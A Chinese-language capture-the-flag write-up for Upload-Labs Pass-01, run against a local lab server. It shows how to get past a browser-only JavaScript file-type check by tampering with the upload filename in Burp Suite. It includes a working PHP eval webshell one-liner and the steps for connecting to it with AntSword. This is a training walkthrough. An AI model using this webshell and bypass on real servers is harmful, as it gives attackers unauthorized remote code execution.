【Upload-Labs】Pass-01 前端 JavaScript 校验绕过 Writeup

操作者：何芊宏 | 操作日期：2026.11.02 | 分类：CTF | 标签：Upload-Labs, Web, 文件上传, 前端绕过, WebShell

1. 题目信息

  • 平台：Upload-Labs (本地 phpStudy 环境)
  • 分类：Web - 文件上传
  • 题目名称：Pass-01 (前端 JS 校验)
  • 提示：任务为上传一个 webshell 到服务器。页面表单通过 onsubmit="return checkFile()" 调用前端 JavaScript 函数进行拦截。

2. 核心原理与前置分析

本关卡的核心漏洞在于客户端（前端）校验的不可信性。

分析页面源码可知，表单提交时触发 checkFile() 函数。该函数获取用户选择的文件名，提取后缀并判断，仅允许 .jpg|.png|.gif 后缀，否则通过 alert() 弹窗并中断提交。

然而，服务端 PHP 代码完全没有做任何过滤，直接使用 move_uploaded_file() 将上传的临时文件移动到目标目录，并保留原文件名。由于前端验证仅在浏览器端执行，通过抓包工具拦截并篡改 HTTP 请求，即可绕过该防御机制。

3. 工具配置与操作步骤

工具配置：Burp Suite 与 中国蚁剑

  • Burp Suite：用于拦截 HTTP 请求并修改 multipart 表单数据。
  • 中国蚁剑：URL 地址：http://127.0.0.1:8081/upload/shell.php；连接密码：pass；编码：UTF-8。

操作步骤与解析：

第一步：准备 Payload 并伪装后缀

新建文本文件，写入 PHP 代码：<?php @eval($_POST['pass']); ?>，确保保存编码为 UTF-8 无 BOM。保存为 shell.php。

为了通过前端验证，将文件重命名为 shell.php.jpg。此时前端 JS 提取的后缀为 .jpg，判定为合法图片并放行。

第二步：抓包篡改请求参数（核心行动）

开启 Burp Suite 拦截模式。在网页中选择 shell.php.jpg 并点击上传。Burp 成功拦截到 POST 请求。

在请求体中找到 Content-Disposition 字段：

Content-Disposition: form-data; name="upload_file"; filename="shell.php.jpg"

将其篡改为：

Content-Disposition: form-data; name="upload_file"; filename="shell.php"

点击 Forward 放行。此时服务器接收到的文件名变为 shell.php，且文件内容为纯文本 PHP 代码，成功保存到上传目录。

第三步：验证与连接

在浏览器中访问 http://127.0.0.1:8081/upload/shell.php。页面呈现纯白空白状态（无报错、无源码泄露、无图片乱码），证明文件已被 PHP 引擎成功解析。

打开蚁剑，填入对应的 URL 和密码 pass，点击测试连接，成功获取服务器文件目录浏览权限。

4. 踩坑记录与复盘

  • 将真实图片作为 WebShell 上传：最初直接选择真实图片 1.jpg 进行抓包改名，导致服务器上的 shell.php 本质是一张图像。访问时输出二进制乱码，且无任何可执行代码。
  • 漏改 HTTP 请求中的 filename：在本地生成了 shell.php.jpg，但 Burp 拦截后，未将请求包中的 filename 修改为 shell.php。导致服务器最终落地的文件依旧是 .jpg 结尾，Apache 不会调用 PHP 解析器处理该文件。
  • 后缀拼写错误：测试过程中产生了 shell.ph、shell.phg 等无效后缀文件。由于这些后缀不在 Apache 的 FcgidWrapper 解析白名单内，导致连接失败。
  • 旧文件缓存与覆盖失败：由于之前的操作失误，旧的图片马一直占用着 shell.php 的文件名。后续未正确修改请求包，导致新文件变为 shell.php.jpg 保存，旧的乱码文件未被覆盖，引发误判。
  • 密码配置错位：本地 Payload 的接收参数为 pass，但在蚁剑中配置了历史遗留的 cmd，导致认证失败返回空数据。

5. 知识点总结

  • 前端校验不可信：任何依赖 JavaScript 或浏览器执行的校验逻辑，都可以通过禁用 JS、修改 DOM 或使用 Burp Suite 拦截篡改数据包来绕过。
  • WebShell 落地的必要条件：文件内容必须是合法的 PHP 代码语法；文件最终保存的绝对后缀必须是服务器能够解析的脚本后缀（如 .php）。
